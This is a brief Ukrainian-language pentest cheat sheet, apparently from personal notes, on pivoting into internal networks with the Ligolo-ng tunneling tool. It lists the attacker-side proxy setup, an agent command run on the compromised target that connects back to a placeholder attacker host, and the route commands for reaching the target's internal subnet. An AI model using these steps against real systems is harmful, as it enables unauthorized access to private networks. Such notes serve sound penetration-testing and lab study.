# Ligolo-ng (основний інструмент pivoting)

## На атакері (proxy)
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```
## На цілі (agent)
```bash
./agent -connect <ATTACKER>:11601 -ignore-cert
```
## У сесії proxy
```
session                      # обрати агента
ifconfig                     # побачити внутрішні підмережі
# в окремому терміналі додати маршрут:
sudo ip route add <internal-subnet>/24 dev ligolo
start
```
**Підводні камені:** маршрут додавай саме на внутрішню підмережу агента; перевір `ifconfig` в сесії.
**Зв'язки:** [[Double-Tunneling-DNS]] · [[Attack-Lifecycle]]
